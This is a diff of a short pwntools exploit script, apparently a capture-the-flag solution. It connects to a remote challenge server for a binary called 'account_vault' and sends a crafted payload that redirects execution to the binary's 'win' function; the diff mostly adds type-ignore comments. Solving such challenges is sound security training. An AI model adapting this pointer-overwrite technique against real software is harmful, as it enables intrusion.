@@ -1,16 +1,16 @@
 #!/usr/bin/env python3
-from pwn import *
+from pwn import * # type: ignore
 
-context.binary = elf = ELF('./account_vault', checksec=False)
+context.binary = elf = ELF('./account_vault', checksec=False) # type: ignore
 
-
+p=process(elf.path) # type: ignore
 p=remote('offsec.m0lecon.it',13555)
 win = elf.sym.win
 
 p.sendlineafter(b'> ', b'1')                        
 p.sendlineafter(b'> ', b'2')                     
 p.sendlineafter(b'> ', b'3')                       
-p.sendafter(b'data: ', p64(win).ljust(32, b'X'))
+p.sendafter(b'data: ', p64(win).ljust(32, b'X')) # type: ignore
 p.sendlineafter(b'> ', b'4')            
 
 print(p.recvall(timeout=2).decode(errors='replace'))
